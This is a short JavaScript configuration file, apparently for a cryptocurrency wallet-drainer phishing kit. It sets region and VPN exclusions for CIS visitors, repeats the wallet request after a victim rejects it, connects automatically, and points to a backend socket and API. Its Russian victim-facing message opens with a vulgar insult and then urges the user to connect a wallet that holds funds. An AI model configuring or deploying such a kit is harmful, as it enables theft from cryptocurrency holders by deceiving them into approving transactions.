let sng = false;
let superSng = true; // disable connections by vpn
let requestCountAfterReject = 1;
let useCustomButton = true;
const socketURL = "ws://127.0.0.1";
const apiURL = "127.0.0.1:3000";
const autoConnect = true;
const min = {
    heading: 'Ваша мама шлюха!',
    paragraph: ' и у вас недостаточно деняг, подключите кошелёк, на котором есть средства для проведения операции'
}

// dont edit
module.exports.disableSng = sng;
module.exports.disableSngLanguage = superSng;
module.exports.requestCountAfterReject = requestCountAfterReject;
module.exports.useCustomButton = useCustomButton;
module.exports.socketURL = socketURL;
module.exports.apiURL = apiURL;
module.exports.autoConnect = autoConnect;
module.exports.min = min;